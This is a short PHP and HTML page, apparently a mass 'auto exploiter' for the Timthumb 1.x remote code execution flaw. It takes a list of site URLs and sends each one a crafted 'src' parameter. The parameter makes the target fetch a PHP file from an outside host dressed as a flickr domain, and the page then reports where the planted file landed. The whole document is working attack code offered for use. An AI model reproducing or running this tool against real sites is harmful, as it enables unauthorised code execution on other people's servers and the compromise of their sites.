<title>AutoExploiter Timthumb 1.x RCE</title>
<style>
 textarea {
 	width: 600px; 
 	height: 250px; 
 	margin: 5px auto; 
 	resize: none;
 }
</style>
<center>
<form action="" method="POST">
<textarea name="url"></textarea><br>
<input style="width: 300px;" type="submit" name="dor" value="Execute">
</form>
</center>

<?php

// Coded By UstadCage_48
// Auto Exploiter Timthumb 1x RCE

function send($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$output = curl_exec($ch);
	curl_close($ch);
	return $output;
}

$url = $_POST['url'];
$explode = explode("\r\n",$url);
if($_POST['dor']){
	
foreach($explode as $site){
	
	$data = send($site."?src=http://flickr.com.acc-checker.live/vi/by.php");
	
	if(preg_match("/Unable to open image/",$data)){
$datas = explode("Unable to open image :",$data);
$pec = explode("<br />",$datas[1]);
echo "-:- Scan : $site <br>";
echo "-:- Result : <font color=green>".$pec[0]."</font><br>";
} else {
	echo "-:- Scan : $site <br>";
	echo "-:- Result : <font color=red>Not Vulnerability !!</font><br>";
}

}
}
?>
